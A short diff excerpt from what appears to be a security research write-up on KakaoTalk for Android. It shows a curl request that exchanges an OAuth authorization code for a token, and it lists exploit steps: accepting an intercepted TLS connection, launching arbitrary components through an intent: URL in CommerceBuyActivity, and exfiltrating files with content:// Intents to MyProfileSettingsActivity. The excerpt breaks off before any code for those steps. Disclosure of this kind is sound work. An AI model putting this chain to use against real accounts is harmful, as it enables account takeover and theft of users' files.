@@ -76,7 +76,6 @@ curl -i -s -k -X $'POST' \
     --data-binary $'client_id=24b2ff717557a8090279253242652f80&code=pYn2ksN-KH8bIaCHp3OwiM98G5xgdzkEvIgA4HDBhUT-uVcrTXzHiEgp1vA1HrERSESLXQoqJY8AAAGI3iGODg&grant_type=authorization_code&android_key_hash=S2FrYW9JIE1hc3RlciBLZXkg&redirect_uri=kakao24b2ff717557a8090279253242652f80%3A%2F%2Foauth' \
     $'https://kauth.kakao.com/oauth/token'
 ```
-- I can MITM TLS connections. There's just a security warning in KakaoTalk's UI that the user can accept (no need to put a Burp CA cert into Android trusted CA store).
 - I can start arbitrary components via the `intent:` scheme in `CommerceBuyActivity` (`kakaotalk://buy`)
   - I can exfiltrate files by sending Intents with `content://` URLs to `MyProfileSettingsActivity`:
 ```javascript
